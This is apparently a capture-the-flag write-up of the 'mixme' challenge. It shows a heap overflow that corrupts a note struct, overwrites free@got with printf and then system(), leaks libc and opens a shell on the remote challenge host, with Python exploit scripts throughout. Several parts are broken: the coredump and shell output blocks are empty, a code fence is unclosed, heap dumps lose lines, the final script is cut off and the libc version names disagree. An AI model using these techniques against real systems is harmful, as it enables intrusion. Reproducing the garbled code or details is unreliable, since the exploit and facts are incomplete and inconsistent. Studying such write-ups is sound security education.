`mixme` was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!

When started, `mixme` present the following:

```
==========================================
======== Uncle Podger's Data Store =======
==========================================

Select op (store/get/edit/exit): store
Name: a
Size: 4
Enter data: AAAA
Select op (store/get/edit/exit): get

AAAASelect op (store/get/edit/exit): get

```

Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon `get`ing a note, the program erases the note by `free()`ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different...

I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could *edit* a note with a larger value than was allocated. The heap looks like this after allocating three notes `a`, `b` and `c` with length 4 and contents `AAAA`, `BBBB`, and `CCCC`, respectively:

```
# allocated three notes, in heap:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
```

At `0x8314030`, we see the first note's name, `a`. The zeroeth note is called `HEAD` and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note `a` contains this pointer: `0x08314058`, which points to the data associated with that note: `AAAA`. The meta-data for the note looks something like this:

```c
note_info struct {
    char name[16];
    int length;
    char *content;
    note_info *next_note;
    note_info *prev_note;
};
```

This also is true for the next note, `b`, which is immediately after `a` in memory. We can overwrite the meta-data of note `b` by editing note `a`. 

Overflowing the heap
---

If we supply 40 bytes when editing `a` and supplying forty times `0x41`, we overwrite several parts of the meta-data of note `b`:

```
# after editing 'a' with 40 bytes where 4 is allocated:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141

0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
```

If we now try to `get` note `b`, the binary will segfault because the pointer to the note's data is set to `0x41414141`. We can use this to make note `b` point to `free@got` with a bit of python. The binary is started using socat to make it listen on a port.

```
# set 'a' with large buffer, overwriting meta-data of 'b':
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008

0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
```

Notice that I've kept the bytes at `0x8314064` and `0x8314068` the same: `0x00000029 0x00000062`. If these are overwritten, then the binary cannot find note `b` anymore, which effectively stops our attack! I overwrote the pointer to the data with `0x804b020`. This is the pointer to `free()` in the Global Offset Table. Remember, after every `get` sent to the binary, `free()` is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an `edit b` command to the binary! 

Control of execution
---

I tested this hypothesis with the following python:

```python
import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('<L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

z(s, "store")
z(s, "c")
z(s, "4")
z(s, "CCCC")

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, 'BBBB')

z(s, 'get')
z(s, 'c')
z(s, '4')
```

This made the binary crash. The coredump reported the following:

```python

```

Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.

Turning the heap overflow into a format string vulnerability
---

With what should I overwrote the got pointer to `free()` though? I looked for ROP gadgets, but there weren't enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first. 

After thinking about it, I chose to overwrite `free@got` with `printf@plt`. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from...

After setting `free@got` to `printf@plt`, whenever I ask the binary to `get` a note, I can print whatever content is associated with that note (because `free()` is called with the pointer to the content of the note). 

I examined the stack by supplying a format string consisting of a bunch of `%x`'s. Obviously, I couldn't dig up my own format string from the stack, because the format string itself is on the heap!

What's that gem?
---

Examining the stack, I dumped the following data:

```
# local binary
85850c8-122-b75c77b0-122-85850a0-85850a0-63... <snip>
```

That third address looks promising! It points into `libc`. Unfortunately, there's a problem. Running the script against the server gave a different address:

```
# remote binary
83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... <snip>
936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... <snip>
```

We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into `%3$s` to find out which bytes were on the local and remote libc address. For the local binary, it returned `0x168bc085`. For the remote binary, however, it returned `0x7501c083`. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?

Finding the correct libc
---

I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get `system()` and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, `ssh` was enabled:

```bash
bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013

<snip>
```

Googling `OpenSSH_6.6.1p1 Ubuntu-2ubuntu2` led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:

```bash
bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done

I struck gold with libc-2.19-0ubuntu6.4.so:

```
0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&....
```

Those bytes (0x7501c083) where at an offset of `xxxx6024` in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:

```bash
LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
``` 

and attached `gdb` to dump the address of `system()`. Using the aforementioned value from the stack, I calculated the offset to `system()`. I quickly modified my script to include this, overwriting `free@got` with `system()`. When I now made a note with the value `/bin/sh` and asked the binary to `get` that note, it wants to `free()` it. However, `free@got` is replaced with system(), effectively making the binary call `system('/bin/sh');`!

So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python. 

```python
import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('<L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")

I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:

```bash

The flag was `aw3s0m3++_hipp1e_pwn_r0ckst4r`. This one was really though and I'm glad I managed to beat it with just 20 minutes left for the ctf!
